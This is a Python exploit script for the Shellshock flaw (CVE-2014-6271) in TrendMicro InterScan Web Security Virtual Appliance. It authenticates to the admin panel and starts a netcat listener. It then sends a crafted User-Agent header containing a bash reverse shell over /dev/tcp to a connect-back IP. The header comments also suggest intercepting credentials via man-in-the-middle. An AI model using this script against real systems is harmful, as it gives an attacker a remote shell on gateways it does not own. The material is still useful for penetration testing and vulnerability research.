#!/usr/bin/env python
# TrendMicro InterScan Web Security Virtul Appliance
# ==================================================
# InterScan Web Security is a software virtual appliance that 
# dynamically protects against the ever-growing flood of web 
# threats at the Internet gateway exclusively designed to secure 
# you against traditional and emerging web threats at the Internet 
# gateway. The appliance however is shipped with a vulnerable
# version of Bash susceptible to shellshock (I know right?). An
# attacker can exploit this vulnerability by calling the CGI
# shellscript "/cgi-bin/cgiCmdNotify" which can be exploited
# to perform arbitrary code execution. A limitation of this 
# vulnerability is that the attacker must have credentials for
# the admin web interface to exploit this flaw. The panel runs
# over HTTP by default so a man-in-the-middle attack could be
# used to gain credentials and compromise the appliance.
# 
# $ python trendmicro_IWSVA_shellshock.py 192.168.56.101 admin password 192.168.56.1
# [+] TrendMicro InterScan Web Security Virtual Appliance CVE-2014-6271 exploit
# [-] Authenticating to '192.168.56.101' with 'admin' 'password'
# [-] JSESSIONID = DDE38E62757ADC00A51311F1F953EEBA
# [-] exploiting shellshock CVE-2014-6271...
# bash: no job control in this shell
# bash-4.1$ id
# uid=498(iscan) gid=499(iscan) groups=499(iscan)
# 
# -- Hacker Fantastic 
#
# (https://www.myhackerhouse.com)
import SimpleHTTPServer
import subprocess
import requests
import sys
import os

def spawn_listener():
	os.system("nc -l 8080")

def shellshock(ip,session,cbip):
	user_agent = {'User-agent': '() { :; }; /bin/bash -i >& /dev/tcp/'+cbip+'/8080 0>&1'}
	cookies = {'JSESSIONID': session}
	print "[-] exploiting shellshock CVE-2014-6271..."
	myreq = requests.get("http://"+ip+":1812/cgi-bin/cgiCmdNotify", headers = user_agent, cookies = cookies)

def login_http(ip,user,password):
	mydata = {'wherefrom':'','wronglogon':'no','uid':user, 'passwd':password,'pwd':'Log+On'}
	print "[-] Authenticating to '%s' with '%s' '%s'" % (ip,user,password)
	myreq = requests.post("http://"+ip+":1812/uilogonsubmit.jsp", data=mydata)	
	session_cookie = myreq.history[0].cookies.get('JSESSIONID')
	print "[-] JSESSIONID = %s" % session_cookie 
	return session_cookie

if __name__ == "__main__":
	print "[+] TrendMicro InterScan Web Security Virtual Appliance CVE-2014-6271 exploit"
	if len(sys.argv) < 5:
		print "[-] use with <ip> <user> <pass> <connectback_ip>"
		sys.exit()
	newRef=os.fork()
    	if newRef==0:
		spawn_listener()
    	else:
		session = login_http(sys.argv[1],sys.argv[2],sys.argv[3])
		shellshock(sys.argv[1],session,sys.argv[4])
